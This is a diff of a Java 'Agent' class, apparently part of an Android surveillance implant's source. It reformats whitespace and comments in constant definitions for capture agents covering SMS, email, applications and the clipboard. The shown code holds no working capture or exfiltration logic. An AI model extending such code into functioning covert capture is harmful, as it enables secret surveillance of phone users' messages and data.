@@ -11,13 +11,13 @@ package com.ht.RCSAndroidGUI.agent;
  * The Class Agent.
  */
 public class Agent {
-	
+
 	/** Agents definitions. */
 	final public static int AGENT = 0x1000;
-	
+
 	/** The Constant AGENT_INFO. */
 	final public static int AGENT_INFO = AGENT;
-	
+
 	/** The Constant AGENT_SMS. */
 	final public static int AGENT_SMS = AGENT + 0x1; // Agente di cattura delle
 	// Email/Sms/Mms
@@ -78,7 +78,7 @@ public class Agent {
 	// appunti
 	/** The Constant AGENT_CRISIS. */
 	final public static int AGENT_CRISIS = AGENT + 0x10; // Agente di Crisis
-	
+
 	/** The Constant AGENT_APPLICATION. */
 	final public static int AGENT_APPLICATION = AGENT + 0x11; // Agente per la
 	// cattura delle
@@ -90,22 +90,22 @@ public class Agent {
 
 	/** Agent status definitions. */
 	final public static int AGENT_DISABLED = 0x1;
-	
+
 	/** The Constant AGENT_ENABLED. */
 	final public static int AGENT_ENABLED = 0x2;
-	
+
 	/** The Constant AGENT_RUNNING. */
 	final public static int AGENT_RUNNING = 0x3;
-	
+
 	/** The Constant AGENT_STOPPED. */
 	final public static int AGENT_STOPPED = 0x4;
 
 	/** The Constant AGENT_STOP. */
 	final public static int AGENT_STOP = AGENT_STOPPED;
-	
+
 	/** The Constant AGENT_RELOAD. */
 	final public static int AGENT_RELOAD = 0x1;
-	
+
 	/** The Constant AGENT_ROTATE. */
 	final public static int AGENT_ROTATE = 0x2;
 
@@ -113,30 +113,33 @@ public class Agent {
 	private final int agentId;
 
 	/** Agent status: enabled, disabled, running, stopped. */
-	//private int agentStatus;
+	// private int agentStatus;
 
 	/** Parameters. */
 	private final byte[] agentParams;
 
-	private boolean agentEnabled;
+	private final boolean agentEnabled;
 
 	/**
 	 * Instantiates a new agent.
-	 *
-	 * @param id the id
-	 * @param status the status
-	 * @param params the params
+	 * 
+	 * @param id
+	 *            the id
+	 * @param status
+	 *            the status
+	 * @param params
+	 *            the params
 	 */
 	public Agent(final int id, final boolean enabled, final byte[] params) {
 		this.agentId = id;
-		//this.agentStatus = AGENT_STOPPED;
+		// this.agentStatus = AGENT_STOPPED;
 		this.agentEnabled = enabled;
 		this.agentParams = params;
 	}
 
 	/**
 	 * Gets the id.
-	 *
+	 * 
 	 * @return the id
 	 */
 	public int getId() {
@@ -149,7 +152,7 @@ public class Agent {
 
 	/**
 	 * Gets the params.
-	 *
+	 * 
 	 * @return the params
 	 */
 	public byte[] getParams() {
